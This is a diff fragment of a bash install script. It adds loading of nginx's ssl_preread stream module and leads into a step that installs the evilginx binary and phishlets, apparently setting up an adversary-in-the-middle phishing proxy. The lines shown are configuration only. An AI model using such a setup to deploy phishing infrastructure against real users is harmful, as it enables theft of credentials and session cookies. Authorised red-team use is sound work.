@@ -65,6 +65,11 @@ sed -i '/load_module.*ngx_stream_module/d' /etc/nginx/nginx.conf
 if [[ -f /usr/lib/nginx/modules/ngx_stream_module.so ]]; then
     sed -i '1i load_module /usr/lib/nginx/modules/ngx_stream_module.so;' /etc/nginx/nginx.conf
 fi
+if [[ -f /usr/lib/nginx/modules/ngx_stream_ssl_preread_module.so ]]; then
+    if ! grep -q "ngx_stream_ssl_preread_module.so" /etc/nginx/nginx.conf; then
+        sed -i '1i load_module /usr/lib/nginx/modules/ngx_stream_ssl_preread_module.so;' /etc/nginx/nginx.conf
+    fi
+fi
 
 echo "==> Step 2/6  evilginx binary + phishlets"
 mkdir -p "$EVG_DIST/phishlets"
